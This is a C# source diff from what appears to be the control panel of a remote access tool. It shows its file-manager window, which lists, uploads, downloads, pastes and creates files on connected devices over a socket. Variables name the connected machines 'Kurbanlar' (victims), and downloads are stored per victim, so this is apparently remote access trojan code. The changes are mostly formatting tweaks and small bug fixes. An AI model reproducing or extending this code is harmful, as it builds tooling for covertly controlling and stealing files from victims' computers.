@@ -94,7 +94,7 @@ namespace SV
                         {
                             ListViewItem lv = new ListViewItem(parse[0]);
                             lv.SubItems.Add(parse[1]);
-                            lv.SubItems.Add(parse[2].Replace("XX_FOLDER_XX","Folder"));
+                            lv.SubItems.Add(parse[2].Replace("XX_FOLDER_XX", "Folder"));
                             lv.SubItems.Add(parse[3]);
                             lv.SubItems.Add(parse[4].Replace("CİHAZ", "Device"));
                             if (parse[2] == "XX_FOLDER_XX")
@@ -104,12 +104,17 @@ namespace SV
                             }
                             else
                             {
-                                Invoke((MethodInvoker)delegate { 
-                                if (!ımageList1.Images.ContainsKey(parse[2].ToLower()))
+                                Invoke((MethodInvoker)delegate
                                 {
-                                    ımageList1.Images.Add(parse[2].ToLower(), FileIcon.GetFileIcon(parse[2].ToLower(), FileIcon.IconSize.SHGFI_SMALLICON));
-                                }
-                                lv.ImageKey = parse[2].ToLower();
+                                    if (string.IsNullOrEmpty(parse[2].ToLower()))
+                                    {
+                                        parse[2] = ".null";
+                                    }
+                                    if (!ımageList1.Images.ContainsKey(parse[2].ToLower()))
+                                    {
+                                        ımageList1.Images.Add(parse[2].ToLower(), FileIcon.GetFileIcon(parse[2].ToLower(), FileIcon.IconSize.SHGFI_SMALLICON));
+                                    }
+                                    lv.ImageKey = parse[2].ToLower();
                                 });
                                 switch (parse[2].ToLower())
                                 {
@@ -138,7 +143,7 @@ namespace SV
                                     case ".flac":
                                     case ".ota":
                                         lv.Tag = "music";
-                                        break;                                  
+                                        break;
                                     default:
                                         lv.Tag = "null";
                                         break;
@@ -167,7 +172,7 @@ namespace SV
                         {
                         }
                     }
-                    listView2.Items.AddRange(lArray_.ToArray());                    
+                    listView2.Items.AddRange(lArray_.ToArray());
                 }
             }
             catch (Exception)
@@ -226,6 +231,7 @@ namespace SV
                                 {
                                     listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") +
                                         $" - Don't allow to upload empty file, size is 0 byte => {Path.GetFileName(myFilepath)}");
+                                    metroTabControl1.SelectedIndex = 2;
                                 }
                                 System.Threading.Tasks.Task.Delay(5).Wait();
                             }
@@ -280,7 +286,7 @@ namespace SV
                         yenile();
                     }
                 }
-                else if(listView1.SelectedItems[0].Tag.ToString() != "folder")
+                else if (listView1.SelectedItems[0].Tag.ToString() != "folder")
                 {
                     toolStripMenuItem12.PerformClick();
                 }
@@ -360,7 +366,7 @@ namespace SV
                 }
                 label1.Text = "Name:";
                 label2.Text = "Path:";
-                label3.Text = "Size:" ;
+                label3.Text = "Size:";
                 label4.Text = "Extension:";
                 label5.Text = "Location:";
             }
@@ -434,8 +440,9 @@ namespace SV
                         }
                         else
                         {
-                            listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") + 
+                            listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") +
                                 $" - Don't allow to download empty file, size is 0 byte => {down.Text}");
+                            metroTabControl1.SelectedIndex = 2;
                         }
                     }
                     System.Threading.Tasks.Task.Delay(5).Wait();
@@ -640,7 +647,7 @@ namespace SV
         {
             cuted = true;
             clipBoard.Clear();
-            foreach(ListViewItem cut in listView1.SelectedItems)
+            foreach (ListViewItem cut in listView1.SelectedItems)
             {
                 if (cut.Tag.ToString() != "back")
                 {
@@ -657,24 +664,24 @@ namespace SV
                         cut.Remove();
                     }
                     catch (Exception) { }
-                }               
+                }
             }
         }
 
         private void toolStripMenuItem11_Click(object sender, EventArgs e)
         {
-            foreach(string file in clipBoard)
+            foreach (string file in clipBoard)
             {
                 try
                 {
-                    string data = file + "[VERI]" + textBox1.Text + $"/{file.Substring(file.LastIndexOf("/") + 1).Split(new string []{ "[PROPERTY]" }, StringSplitOptions.None)[0]}" + "[VERI]" + cuted.ToString();
+                    string data = file + "[VERI]" + textBox1.Text + $"/{file.Substring(file.LastIndexOf("/") + 1).Split(new string[] { "[PROPERTY]" }, StringSplitOptions.None)[0]}" + "[VERI]" + cuted.ToString();
                     byte[] senddata = Form1.MyDataPacker("PASTE", Encoding.UTF8.GetBytes(data));
                     soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                 }
                 catch (Exception) { }
                 System.Threading.Tasks.Task.Delay(5).Wait();
             }
-                       
+
             if (clipBoard.Count > 0)
             {
                 System.Threading.Tasks.Task.Delay(10).Wait();
@@ -735,7 +742,7 @@ namespace SV
 
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
-            if(listView1.SelectedItems.Count == 1)
+            if (listView1.SelectedItems.Count == 1)
             {
                 if (listView1.SelectedItems[0].Tag.ToString() != "back")
                 {
@@ -795,11 +802,11 @@ namespace SV
 
         private void toolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
         {
-            if(e.KeyCode == Keys.Enter)
+            if (e.KeyCode == Keys.Enter)
             {
                 try
                 {
-                    byte[] senddata = Form1.MyDataPacker("NEWFILE", Encoding.UTF8.GetBytes( textBox1.Text + "/" + toolStripTextBox1.Text));
+                    byte[] senddata = Form1.MyDataPacker("NEWFILE", Encoding.UTF8.GetBytes(textBox1.Text + "/" + toolStripTextBox1.Text));
                     soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                 }
                 catch (Exception) { }
@@ -810,14 +817,14 @@ namespace SV
         private void toolStripMenuItem15_Click(object sender, EventArgs e)
         {
             Kurbanlar krbn = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
-            if(krbn != null)
+            if (krbn != null)
             {
                 if (Directory.Exists(Environment.CurrentDirectory + "\\Store\\Downloads\\" +
                     krbn.identify))
                 {
                     System.Diagnostics.Process.Start(Environment.CurrentDirectory + "\\Store\\Downloads\\" +
                         krbn.identify);
-                }              
+                }
             }
             else
             {
